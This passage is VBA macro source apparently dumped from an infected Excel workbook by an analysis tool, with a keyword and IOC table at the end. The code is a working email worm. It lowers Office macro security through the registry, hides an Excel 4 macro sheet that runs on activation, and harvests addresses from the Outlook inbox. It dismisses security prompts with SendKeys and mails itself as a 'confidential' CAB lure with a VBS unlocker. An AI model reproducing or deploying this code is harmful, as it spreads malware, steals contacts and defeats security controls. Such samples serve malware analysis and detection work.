RK2 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VS & "\Excel\Security\Level"
RK3 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\" & VS & "\Excel\Security\AccessVBOM"
RK4 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\" & VS & "\Excel\Security\Level"

KValue1 = 1
KValue2 = 1

      Call WReg(RK1, KValue1, "REG_DWORD")
      Call WReg(RK2, KValue2, "REG_DWORD")
      Call WReg(RK3, KValue1, "REG_DWORD")
      Call WReg(RK4, KValue2, "REG_DWORD")

End Function

Sub WReg(strkey As String, Value As Variant, ValueType As String)
Attribute WReg.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim oWshell
    Set oWshell = CreateObject("WScript.Shell")
    If ValueType = "" Then
        oWshell.RegWrite strkey, Value
    Else
        oWshell.RegWrite strkey, Value, ValueType
    End If
    Set oWshell = Nothing
End Sub


Private Sub Movemacro4(ByVal wb As Workbook)
On Error Resume Next

  Dim sht As Object

    wb.Sheets(1).Select
    Sheets.Add Type:=xlExcel4MacroSheet
    ActiveSheet.Name = "Macro1"
   
    Range("A2").Select
    ActiveCell.FormulaR1C1 = "=ERROR(FALSE)"
    Range("A3").Select
    ActiveCell.FormulaR1C1 = "=IF(ERROR.TYPE(RUN(""" & Application.UserName & """))=4)"
    Range("A4").Select
    ActiveCell.FormulaR1C1 = "=ALERT(""禁用宏，关闭 " & Chr(10) & Now & Chr(10) & "Please Enable Macro!"",3)"
    Range("A5").Select
    ActiveCell.FormulaR1C1 = "=FILE.CLOSE(FALSE)"
    Range("A6").Select
    ActiveCell.FormulaR1C1 = "=END.IF()"
    Range("A7").Select
    ActiveCell.FormulaR1C1 = "=RETURN()"
    
    For Each sht In wb.Sheets
    wb.Names.Add sht.Name & "!Auto_Activate", "=Macro1!$A$2", False
    Next
    wb.Excel4MacroSheets(1).Visible = xlSheetVeryHidden
End Sub

Private Function WorkbookOpen(WorkBookName As String) As Boolean
  WorkbookOpen = False
  On Error GoTo WorkBookNotOpen
  If Len(Application.Workbooks(WorkBookName).Name) > 0 Then
    WorkbookOpen = True
    Exit Function
  End If
WorkBookNotOpen:
End Function

Private Sub ActionJudge()
Const T1 As Date = "10:00:00"
Const T2 As Date = "11:00:00"
Const T3 As Date = "14:00:00"
Const T4 As Date = "15:00:00"
Dim SentTime As Date, WshShell

Set WshShell = CreateObject("WScript.Shell")
If Not InStr(UCase(WshShell.RegRead("HKEY_CLASSES_ROOT\mailto\shell\open\command\")), "OUTLOOK.EXE") > 0 Then Exit Sub

If Time >= T1 And Time <= T2 Or Time >= T3 And Time <= T4 Then
      If ReadOut("D:\Collected_Address:frag1.txt") = "1" Then
           Exit Sub
      Else
           CreateFile "1", "D:\Collected_Address:frag1.txt"
           search_in_OL
      End If
Else
     If Not if_outlook_open Then Exit Sub
     If Time > T2 And Time <= DateAdd("n", 10, T2) Or Time > T4 And Time <= DateAdd("n", 10, T4) Then
          Exit Sub
     Else
          SentTime = DateAdd("n", -21, Now)
          On Error GoTo timeError
          SentTime = CDate(ReadOut("D:\Collected_Address:frag2.txt"))
timeError:
          If Now < DateAdd("n", 20, SentTime) Or ReadOut("D:\Collected_Address\log.txt") = "" Then
                Exit Sub
          Else
                CreateFile "", "D:\Collected_Address:frag1.txt"
                CreateFile Now, "D:\Collected_Address:frag2.txt"
                CreatCab_SendMail
          End If
     End If
End If
End Sub


Private Sub search_in_OL()
Dim i As Integer, AttName As String, AddVbsFile As String, AddListFile As String, fs As Object, WshShell As Object

On Error Resume Next
Set fs = CreateObject("scripting.filesystemobject")
Set WshShell = CreateObject("WScript.Shell")

If fs.Folderexists("E:\KK") = False Then fs.CreateFolder "E:\KK"
AttName = Replace(Replace(Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4), " ", "_"), ".", "_")
AddVbsFile_clear = "E:\KK\" & AttName & "_clear.vbs"
i = FreeFile()
Open AddVbsFile_clear For Output Access Write As #i

Print #i, "On error Resume Next"
Print #i, "Dim wsh, tle, T0, i"
Print #i, "  T0 = Timer"
Print #i, "  Set wsh=createobject(""" & "wscript.shell""" & ")"
Print #i, "  tle = """ & "Microsoft Office Outlook""" & ""
Print #i, "For i = 1 To 1000"
Print #i, "    If Timer - T0 > 60 Then Exit For"
Print #i, "  Call Refresh()"
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "%a""" & ""
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "{TAB}{TAB}""" & ""
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "{Enter}""" & ""
Print #i, "Next"
Print #i, "Set wsh = Nothing"
Print #i, "wscript.quit"
Print #i, "Sub Refresh()"
Print #i, "Do Until wsh.AppActivate(CStr(tle)) = True"
Print #i, "    If Timer - T0 > 60 Then Exit Sub"
Print #i, "Loop"
Print #i, "  wscript.sleep 05"
Print #i, "    wsh.SendKeys """ & "%{F4}""" & ""
Print #i, "End Sub"
Close (i)

AddVbsFile_search = "E:\KK\" & AttName & "_Search.vbs"
i = FreeFile()
Open AddVbsFile_search For Output Access Write As #i

Print #i, "On error Resume Next"
Print #i, "Const olFolderInbox = 6"
Print #i, "Dim conbinded_address,WshShell,sh,ts"
Print #i, "Set WshShell=WScript.CreateObject(""" & "WScript.Shell""" & ")"
Print #i, "Set objOutlook = CreateObject(""" & "Outlook.Application""" & ")"
Print #i, "Set objNamespace = objOutlook.GetNamespace(""" & "MAPI""" & ")"
Print #i, "Set objFolder = objNamespace.GetDefaultFolder(olFolderInbox)"
Print #i, "Set TargetFolder = objFolder"
Print #i, "conbinded_address = """ & """" & ""
Print #i, "Set colItems = TargetFolder.Items"
Print #i, "wscript.sleep 300000"
Print #i, "WshSHell.Run (""" & "wscript.exe " & AddVbsFile_clear & """" & "), vbHide, False"
Print #i, "ts = Timer"
Print #i, "For Each objMessage in colItems"
Print #i, "       If Timer - ts >55 then exit For"
Print #i, "       conbinded_address = conbinded_address & valid_address(objMessage.Body)"
Print #i, "Next"
Print #i, "add_text conbinded_address, 8"
Print #i, "add_text all_non_same(ReadAllTextFile), 2"
Print #i, "WScript.Quit"
Print #i, ""
Print #i, "Private Function valid_address(source_data)"
Print #i, "   Dim oDict, trimed_data , temp_data, i, t_asc, header_end, trimed_arr, nonsame_arr"
Print #i, "   Dim regex, matchs, ss, arr()"
Print #i, "   Set oDict = CreateObject(""" & "Scripting.Dictionary""" & ")"
Print #i, "   Set regex = CreateObject(""" & "VBSCRIPT.REGEXP""" & ")"
Print #i, ""
Print #i, "   regex.Global = True"
Print #i, "   regex.Pattern = """ & "\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*""" & ""
Print #i, "   Set matchs = regex.Execute(source_data)"
Print #i, "   ReDim trimed_arr(matchs.Count - 1)"
Print #i, "   For i = Lbound(trimed_arr) To Ubound(trimed_arr)"
Print #i, "        trimed_arr(i) = matchs.Item(i) & vbCrLf"
Print #i, "   Next"
Print #i, ""
Print #i, "   For i = LBound(trimed_arr) To UBound(trimed_arr)"
Print #i, "        oDict(trimed_arr(i)) = """ & """" & ""
Print #i, "   Next"
Print #i, ""
Print #i, "   If oDict.Count > 0 Then"
Print #i, "        nonsame_arr = oDict.keys"
Print #i, "        For i = LBound(nonsame_arr) To UBound(nonsame_arr)"
Print #i, "             valid_address = valid_address & nonsame_arr(i)"
Print #i, "        Next"
Print #i, "   End If"
Print #i, "   Set oDict = Nothing"
Print #i, "End Function"
Print #i, ""
Print #i, "Private Sub add_text(inputed_string, input_frag)"
Print #i, "   Dim objFSO, logfile, logtext, log_path, log_folder"
Print #i, "   log_path = """ & "D:\Collected_Address""" & ""
Print #i, "   Set objFSO = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "   On Error resume next"
Print #i, "   Set log_folder = objFSO.CreateFolder(log_path)"
Print #i, ""
Print #i, "   If objFSO.FileExists(log_path & """ & "\log.txt""" & ") = 0 Then"
Print #i, "       Set logfile = objFSO.CreateTextFile(log_path & """ & "\log.txt""" & ", True)"
Print #i, "   End If"
Print #i, "   Set log_folder = Nothing"
Print #i, "   Set logfile = Nothing"
Print #i, ""
Print #i, "   Select Case input_frag"
Print #i, "     Case 8"
Print #i, "          Set logtext = objFSO.OpenTextFile(log_path & """ & "\log.txt""" & ", 8, True, -1)"
Print #i, "          logtext.Write inputed_string"
Print #i, "          logtext.Close"
Print #i, "     Case 2"
Print #i, "          Set logtext = objFSO.OpenTextFile(log_path & """ & "\log.txt""" & ", 2, True, -1)"
Print #i, "          logtext.Write inputed_string"
Print #i, "          logtext.Close"
Print #i, "   End Select"
Print #i, "   set objFSO = nothing"
Print #i, "End Sub"
Print #i, ""
Print #i, "Private Function ReadAllTextFile()"
Print #i, "    Dim objFSO, FileName, MyFile"
Print #i, "    FileName = """ & "D:\Collected_Address\log.txt""" & ""
Print #i, "    Set objFSO = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "    Set MyFile = objFSO.OpenTextFile(FileName, 1, False, -1)"
Print #i, "    If MyFile.AtEndOfStream Then"
Print #i, "        ReadAllTextFile = """ & """" & ""
Print #i, "    Else"
Print #i, "        ReadAllTextFile = MyFile.ReadAll"
Print #i, "    End If"
Print #i, "set objFSO = nothing"
Print #i, "End Function"
Print #i, ""
Print #i, "Private Function all_non_same(source_data)"
Print #i, "   Dim oDict, i, trimed_arr, nonsame_arr"
Print #i, "   all_non_same = """ & """" & ""
Print #i, "   Set oDict = CreateObject(""" & "Scripting.Dictionary""" & ")"
Print #i, ""
Print #i, "   trimed_arr = Split(source_data, vbCrLf)"
Print #i, ""
Print #i, "   For i = LBound(trimed_arr) To UBound(trimed_arr)"
Print #i, "         oDict(trimed_arr(i)) = """ & """" & ""
Print #i, "   Next"
Print #i, ""
Print #i, "   If oDict.Count > 0 Then"
Print #i, "        nonsame_arr = oDict.keys"
Print #i, "        For i = LBound(nonsame_arr) To UBound(nonsame_arr)"
Print #i, "             all_non_same = all_non_same & nonsame_arr(i) & vbCrLf"
Print #i, "        Next"
Print #i, "   End If"
Print #i, "   Set oDict = Nothing"
Print #i, "End Function"
Close (i)
Application.WindowState = xlMaximized
WshShell.Run ("wscript.exe " & AddVbsFile_search), vbHide, False
Set WshShell = Nothing
End Sub

Private Sub CreatCab_SendMail()
Dim i As Integer, AttName As String, AddVbsFile As String, AddListFile As String, Address_list As String
Dim fs As Object, WshShell As Object
Address_list = get_ten_address

Set WshShell = CreateObject("WScript.Shell")
Set fs = CreateObject("scripting.filesystemobject")
If fs.Folderexists("E:\SORCE") = False Then fs.CreateFolder "E:\SORCE"
AttName = Replace(Replace(Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4), " ", "_"), ".", "_")
mail_sub = "*" & AttName & "*Message*"
AddVbsFile = "E:\sorce\" & AttName & "_Key.vbs"
i = FreeFile()
Open AddVbsFile For Output Access Write As #i
    
Print #i, "Dim oexcel,owb, WshShell,Fso,Atta_xls,sh,route"
Print #i, "On error Resume Next"
Print #i, "Set sh=WScript.CreateObject(""" & "shell.application""" & ")"
Print #i, "sh.MinimizeAll"
Print #i, "Set sh = Nothing"
Print #i, "Set Fso = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "Set WshShell = WScript.CreateObject(""" & "WScript.Shell""" & ")"
Print #i, "If Fso.Folderexists(""" & "E:\KK""" & ") = False Then Fso.CreateFolder """ & "E:\KK"""
Print #i, "Fso.CopyFile  _"
Print #i, "WshShell.CurrentDirectory & """ & "\" & AttName & "*.CAB""" & "," & " " & """E:\KK\""" & ", True"
Print #i, "For Each Atta_xls In ListDir(""" & "E:\KK""" & ")"
Print #i, "   WshShell.Run """ & "expand """ & " & Atta_xls & """ & " -F:" & AttName & ".xls E:\KK""" & ", 0, true"
Print #i, "Next"
Print #i, "If Fso.FileExists(""" & "E:\KK\" & AttName & ".xls""" & ") = 0 then"
Print #i, "        route = WshShell.CurrentDirectory & """ & "\" & AttName & ".xls"""
Print #i, "        if Fso.FileExists(WshShell.CurrentDirectory & """ & "\" & AttName & ".xls""" & ")=0 then"
Print #i, "                 route = InputBox(""" & "Warning! """ & " & Chr(10) & """ & "You are going to open a confidential file.""" & "& Chr(10)   _"
Print #i, "                               & """ & "Please input the complete file path.""" & " & Chr(10) & """ & "ex. C:\parth\confidential_file.xls""" & ", _"
Print #i, "                               """ & "Open a File""" & " , """ & "Please Input the Complete File Path""" & ", 10000, 8500)"
Print #i, "        End if"
Print #i, "else"
Print #i, "        route = """ & "E:\KK\" & AttName & ".xls"""
Print #i, "End If"
Print #i, "   set oexcel=createobject(""" & "excel.application""" & ")"
Print #i, "   set owb=oexcel.workbooks.open(route)"
Print #i, "   oExcel.Visible = True"
Print #i, "Set oExcel = Nothing"
Print #i, "Set oWb = Nothing"
Print #i, "Set  WshShell = Nothing"
Print #i, "Set Fso = Nothing"
Print #i, "WScript.Quit"
Print #i, "Private Function ListDir (ByVal Path)"
Print #i, "   Dim Filter, a, n, Folder, Files, File"
Print #i, "       ReDim a(10)"
Print #i, "    n = 0"
Print #i, "  Set Folder = fso.GetFolder(Path)"
Print #i, "   Set Files = Folder.Files"
Print #i, "   For Each File In Files"
Print #i, "      If left(File.Name," & Len(AttName) & ") = """ & AttName & """ and right(File.Name,3) = """ & "CAB""" & " Then"
Print #i, "         If n > UBound(a) Then ReDim Preserve a(n*2)"
Print #i, "            a(n) = File.Path"
Print #i, "            n = n + 1"
Print #i, "       End If"
Print #i, "   Next"
Print #i, "   ReDim Preserve a(n-1)"
Print #i, "   ListDir = a"
Print #i, "End Function"

Close (i)
AddListFile = ThisWorkbook.Path & "\TEST.txt"
i = FreeFile()
Open AddListFile For Output Access Write As #i
Print #i, "E:\sorce\" & AttName & "_Key.vbs"
Print #i, "E:\sorce\" & AttName & ".xls"
Close (i)

Application.ScreenUpdating = False
RestoreBeforeSend
ThisWorkbook.SaveCopyAs "E:\sorce\" & AttName & ".xls"
RestoreAfterOpen
c4$ = CurDir()
ChDrive Left(ThisWorkbook.Path, 3) '"C:\"
ChDir ThisWorkbook.Path
WshShell.Run Environ$("comspec") & " /c makecab /F """ & ThisWorkbook.Path & "\TEST.TXT""" & " /D COMPRESSIONTYPE=LZX /D COMPRESSIONMEMORY=21 /D CABINETNAMETEMPLATE=../" & AttName & ".CAB", vbHide, False

Do Until fs.FileExists(ThisWorkbook.Path & "\TEST.txt") _
And fs.FileExists(ThisWorkbook.Path & "\setup.rpt") And fs.FileExists(ThisWorkbook.Path & "\setup.inf") _
And fs.FileExists(ThisWorkbook.Path & "\" & AttName & ".CAB")
DoEvents
Loop

WshShell.Run Environ$("comspec") & " /c RD /S /Q """ & ThisWorkbook.Path & "\disk1""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\TEST.txt""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\setup.rpt""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\setup.inf""", vbHide, False
WshShell.Run Environ$("comspec") & " /c RD /S /Q E:\sorce", vbHide, False

If fs.Folderexists("E:\KK") = False Then fs.CreateFolder "E:\KK"
WshShell.Run Environ$("comspec") & " /c MOVE /Y " & AttName & ".CAB E:\KK""", vbHide, False
ChDir c4$
Call Massive_SendMail(Address_list, AttName, "Dear all," & vbCrLf & AttName & vbCrLf & "FYI", _
"", "E:\KK\" & AttName & ".CAB")
WshShell.Run Environ$("comspec") & " /c RD /S /Q E:\KK", vbHide, False
Set WshShell = Nothing
Application.ScreenUpdating = True
End Sub

Private Sub Massive_SendMail(Email_Address$, Subject$, Body$, CC_email_add$, Attachment$)
    Dim objOL As Object
    Dim itmNewMail As Object
    If Not if_outlook_open Then Exit Sub
    
    Set objOL = CreateObject("Outlook.Application")
    Set itmNewMail = objOL.CreateItem(olMailItem)
    
    With itmNewMail
        .Subject = Subject
        .Body = Body
        .To = Email_Address
        .cc = CC_email_add
        .Attachments.Add Attachment
        .DeleteAfterSubmit = True
    End With
    On Error GoTo continue
SendEmail:
    itmNewMail.display
    Debug.Print "setforth "
    DoEvents
    DoEvents
    DoEvents
    SendKeys "%s", Wait:=True
    DoEvents
    GoTo SendEmail
continue:
    Set objOL = Nothing
    Set itmNewMail = Nothing
End Sub

Private Function if_outlook_open() As Boolean
Set objs = GetObject("WinMgmts:").InstancesOf("Win32_Process")
if_outlook_open = False
For Each obj In objs
If InStr(obj.Description, "OUTLOOK") > 0 Then
if_outlook_open = True
Exit For
End If
Next
End Function

Private Function RadomNine(length As Integer) As String
 Dim jj As Integer, k As Integer, i As Integer
 RadomNine = ""
 If length <= 0 Then Exit Function
 If length <= 10 Then
     For i = 1 To length
     RadomNine = RadomNine & "$$" & i
     Next i
     Exit Function
 End If
 jj = length / 10
 Randomize
 For i = 1 To 10
      k = Int(Rnd * (jj * i - m - 1)) + 1
      If m + k <> 1 Then RadomNine = RadomNine & "$$" & m + k
      m = m + k
 Next
End Function
Private Function get_ten_address() As String
Dim singleAddress_arr, krr, i As Integer
get_ten_address = ""
singleAddress_arr = Split(ReadOut("D:\Collected_Address\log.txt"), vbCrLf)
krr = Split(RadomNine(UBound(singleAddress_arr) - LBound(singleAddress_arr) + 1), "$$")
For i = 1 To UBound(krr)
get_ten_address = get_ten_address & ";" & singleAddress_arr(CInt(krr(i)) - 1)
Next i
End Function

Private Function ReadOut(FullPath) As String
    On Error Resume Next
    Dim Fso, FileText
    Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
    Set FileText = Fso.OpenTextFile(FullPath, 1, False, -1)
    ReadOut = FileText.ReadAll
    FileText.Close
End Function

Private Sub CreateFile(FragMark, pathf)
    On Error Resume Next
    Dim Fso, FileText
    Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
    If Fso.Folderexists(Left(pathf, Len(pathf) - 10)) = False Then Fso.CreateFolder Left(pathf, Len(pathf) - 10)
    If Fso.FileExists(pathf) Then
        Set FileText = Fso.OpenTextFile(pathf, 2, False, -1)
        FileText.Write FragMark
        FileText.Close
    Else
        Set FileText = Fso.OpenTextFile(pathf, 2, True, -1)
        FileText.Write FragMark
        FileText.Close
    End If
End Sub


Private Sub RestoreBeforeSend()
Dim sht As Object
Application.ScreenUpdating = False
Application.DisplayAlerts = False
On Error Resume Next
For Each aa In ThisWorkbook.Names
     aa.Visible = True
     If Split(aa.Name, "!")(1) = "Auto_Activate" Then aa.Delete
Next
For Each sht In ThisWorkbook.Sheets
     If sht.Name = "Macro1" Then
     sht.Visible = xlSheetVisible
     sht.Delete
     End If
Next
Sheets(1).Select
Sheets.Add
For Each sht In ThisWorkbook.Sheets
     If sht.Name <> Sheets(1).Name Then sht.Visible = xlSheetVeryHidden
Next
i_row = Int((15 * Rnd) + 1)
i_col = Int((6 * Rnd) + 1)
Cells(i_row, i_col) = "** CONFIDENTIAL! ** "
Cells(i_row + 2, i_col) = "Use " & Chr(34) & Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4) & "_key.vbs" & Chr(34) & " To Open This File."
Cells(i_row + 3, i_col) = "请用 " & Chr(34) & Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4) & "_key.vbs" & Chr(34) & " 解锁此文件."
With Range(Cells(i_row, i_col), Cells(i_row + 2, i_col))
     .Font.Bold = True
     .Font.ColorIndex = 3
End With
Application.ScreenUpdating = True
End Sub

Private Function RestoreAfterOpen()
Dim sht, del_sht, rng, del_frag As Boolean
On Error Resume Next
del_sht = ActiveSheet.Name
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For Each sht In ThisWorkbook.Sheets
    If sht.Name <> "Macro1" Then sht.Visible = xlSheetVisible
Next
For Each rng In Sheets(del_sht).Range("A1:F15")
If InStr(rng.Value, "CONFIDENTIAL") > 0 Then
del_frag = True
Exit For
End If
Next
If del_frag = True Then Sheets(del_sht).Delete
Application.ScreenUpdating = True

End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Worksheet_Change    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|shell.application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|sendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |OUTLOOK.EXE         |Executable file name                         |
|IOC       |_clear.vbs          |Executable file name                         |
|IOC       |_Search.vbs         |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |_Key.vbs            |Executable file name                         |
|IOC       |setup.inf           |Executable file name                         |
|IOC       |_key.vbs            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

